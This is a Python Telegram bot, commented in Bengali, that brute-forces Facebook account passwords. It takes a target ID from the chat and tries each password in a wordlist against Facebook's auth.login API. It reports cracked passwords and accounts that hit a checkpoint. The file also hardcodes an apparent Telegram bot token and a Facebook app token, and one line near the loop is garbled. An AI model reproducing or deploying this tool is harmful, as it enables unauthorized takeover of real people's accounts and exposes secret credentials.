import telebot
import requests
import mechanize
import time
import os
from telebot import types
from flask import Flask
from threading import Thread

# রেন্ডারের পোর্ট সমস্যা সমাধানের জন্য Flask সেটআপ
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run_web():
    # Render ডিফল্টভাবে ১০০০০ পোর্ট ব্যবহার করে
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# তোমার টোকেন এখানে সেট করা আছে
TOKEN = '8531505263:AAHHzdZd037mxiP_qa0FC4kc76J7w3YR03g'
bot = telebot.TeleBot(TOKEN)

loop_control = {}

def check_fb_login(email, password):
    try:
        url = "https://b-api.facebook.com/method/auth.login"
        params = {
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "format": "json",
            "sdk_version": "1",
            "email": email,
            "password": password,
            "locale": "en_US",
            "sdk": "ios",
            "generate_session_cookies": "1",
            "sig": "3f555f98fb61fcdbf0f44813f82e1aa"
        }
        response = requests.get(url, params=params)
        data = response.json()
        if "access_token" in data: return "SUCCESS"
        elif "error_msg" in data and "User must verify" in data["error_msg"]: return "CHECKPOINT"
        return "FAILED"
    except: return "ERROR"

@bot.message_handler(commands=['start'])
def welcome(message):
    banner_url = "https://raw.githubusercontent.com/Whomrx666/Brute-fb/main/Brute-fb.jpg"
    welcome_text = (
        "🔥 **WELCOME TO FB-BRUTE-PRO** 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 **Sifat**, তোমার টার্গেট আইডি বা ইমেইলটি দাও:\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        bot.send_photo(message.chat.id, banner_url, caption=welcome_text, parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def start_attack(message):
    target_id = message.text
    chat_id = message.chat.id
    loop_control[chat_id] = True
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP ATTACK", callback_query_data="stop_attack"))
    status_msg = bot.send_message(chat_id, "⚙️ **Initializing Attack...**", parse_mode='Markdown')
    
    try:
        with open('passwords.txt', 'r') as f:
            all_passwords = f.readlines()
        
        total = len(all_passwords)
        for count, pwd in enumerate(all_passwords, 1):
            if not loop_control.get(chat_id):
                bot.edit_message_text(f"🛑 **Attack Stopped!**\nTarget: `{target_id}`", chat_id, status_msg.message_id)
                return

            pwd = pwd.strip()
            if not pwd or "`\n"
                    f"🎯 **Target:** `{target_id}`\n"
                    f"🔥 **Testing:** `{pwd}`", 
                    chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
                )
            
            result = check_fb_login(target_id, pwd)
            
            if result == "SUCCESS":
                bot.send_message(chat_id, f"✅ **SUCCESS!**\n\n🔑 **Password:** `{pwd}`\n👤 **Target:** `{target_id}`", parse_mode='Markdown')
                return
            elif result == "CHECKPOINT":
                bot.send_message(chat_id, f"⚠️ **CHECKPOINT!**\n\n🔑 **Password:** `{pwd}`\n*Account is locked.*", parse_mode='Markdown')
                return

        bot.send_message(chat_id, "❌ **Password Not Found!**")
    except Exception as e:
        bot.send_message(chat_id, f"❗ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
def stop(call):
    loop_control[call.message.chat.id] = False
    bot.answer_callback_query(call.id, "Stopping the attack...")

if __name__ == "__main__":
    t = Thread(target=run_web)
    t.daemon = True
    t.start()
    bot.polling(none_stop=True)
  
